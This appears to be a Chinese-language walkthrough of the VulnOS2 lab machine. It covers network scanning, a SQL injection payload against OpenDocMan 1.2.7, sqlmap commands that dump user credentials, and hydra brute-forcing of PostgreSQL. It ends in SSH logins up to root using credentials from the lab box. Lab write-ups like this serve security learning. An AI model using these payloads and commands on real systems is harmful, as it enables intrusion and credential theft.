VulnOS2

一、主机发现

nmap -sn 192.168.5.0/24

目标IP：192.168.5.17

二、端口、操作系统扫描

nmap -sV -O 192.168.5.17

三、访问Web服务

http://192.168.5.17/jabc/

  • 在Documentation页面中发现提示

    查看html源码时发现

  • 访问http://192.168.5.17/jabcd0cs/

    使用guest/guest账号登陆，发现文件上传功能测试发现是内容过滤

    尝试使用如下payload上传成功

    使用dirsearch扫描目录发现上传文件路径/jabcd0cs/uploads/

    但是访问后发现所有上传的文件都会转成.dat文件后缀，因此文件上传漏洞难以利用

  • 寻找1day

    发现系统为OpenDocMan v1.2.7，因此搜索历史漏洞

    发现存在SQL注入漏洞和访问控制失效漏洞：https://www.exploit-db.com/exploits/32075

  • 利用SQL注入漏洞

    http://192.168.5.17/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,version%28%29,3,4,5,6,7,8,9

    直接使用sqlmap进行利用

    ./sqlmap.py -r pack.txt –current-db

    ./sqlmap.py -r pack.txt -D jabcd0cs –tables

    ./sqlmap.py -r pack.txt -D jabcd0cs –T odm_user --columns

    ./sqlmap.py -r pack.txt -D jabcd0cs –T odm_user -C "username,password" -dump

    使用https://www.somd5.com/查询md5值对应的明文

四、拿Shell

以上在数据库中获取webmin/webmin1980账户信息，尝试使用ssh连接发现可以成功连接

ssh webmin@192.168.5.17

五、权限提升

发现用户目录下存在post.tar.gz压缩包，解压后发现为hydra，可能时需要爆破

同时可以发现目录存在postgres_ext.h，猜测可能时爆破postgres数据库

  • 查看进程信息

    ps -aux

    最终定位到postgres进程

    查看postgres监听的端口

    netstat -nlp

  • 编译hydra

  • 使用字典爆破postgres

    ./hydra -L user.txt -P pass.txt -e nsr 127.0.0.1 postgres

  • 连接postpres

    psql -h 127.0.0.1 -p 5432 -U postgres

    查看数据库信息

    选择system并查看表信息

    发现存在users表，查看users表数据

    SELECT * FROM users;

  • 使用ssh登录vulnosadmin/c4nuh4ckm3tw1c3

    发现用户目录下存在r00t.blend，这是3D Blender文件，将其下载下来

    scp vulnosadmin@192.168.5.17:/home/vulnosadmin/r00t.blend .

  • 使用在线查看网站进行查看https://imagetostl.com/cn/view-blend-online#convert

    发现是一个正方体，在正方体内部存在一个字符串ab12fg//drg

    猜测是root的密码

  • 使用ssh登录root/ab12fg//drg

    id && ls
